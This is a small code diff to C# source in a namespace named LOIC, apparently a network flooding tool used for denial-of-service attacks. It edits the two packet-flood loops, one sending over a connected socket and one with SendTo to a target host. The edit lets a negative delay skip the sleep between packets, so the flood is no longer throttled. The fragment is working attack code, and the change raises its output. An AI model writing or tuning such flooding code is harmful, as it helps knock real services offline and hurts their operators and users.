@@ -62,7 +62,7 @@ namespace LOIC
 							{
 								FloodCount++;
 								socket.Send(buf);
-								System.Threading.Thread.Sleep(Delay+1);
+								if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
 							}
 						}
 						catch { }
@@ -77,7 +77,7 @@ namespace LOIC
 							{
 								FloodCount++;
 								socket.SendTo(buf, SocketFlags.None, RHost);
-								System.Threading.Thread.Sleep(Delay+1);
+								if (Delay >= 0) System.Threading.Thread.Sleep(Delay+1);
 							}
 						}
 						catch { }
